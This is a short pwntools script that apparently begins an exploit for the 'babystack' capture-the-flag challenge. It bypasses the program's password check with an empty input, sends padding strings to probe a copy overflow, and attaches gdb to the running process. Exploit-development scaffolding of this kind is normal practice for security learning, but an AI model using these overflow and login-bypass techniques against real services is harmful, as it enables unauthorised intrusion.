#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
pwn.context.terminal = ['tmux', 'splitw', '-h']

io = pwn.process('./babystack')

io.recvuntil(b'>> ')
io.send(b'1')
io.recvuntil(b'Your passowrd :')
io.send(b'A' * 127)

io.recvuntil(b'>> ')
io.send(b'1')
io.recvuntil(b'Your passowrd :')
io.send(b'\n')

io.recvuntil(b'>> ')
io.send(b'3')
io.recvuntil(b'Copy :')
io.send(b'B' * 63)

pwn.gdb.attach(io, '''
	set disassembly-flavor intel
	layout asm
	focus cmd
''')

io.interactive()
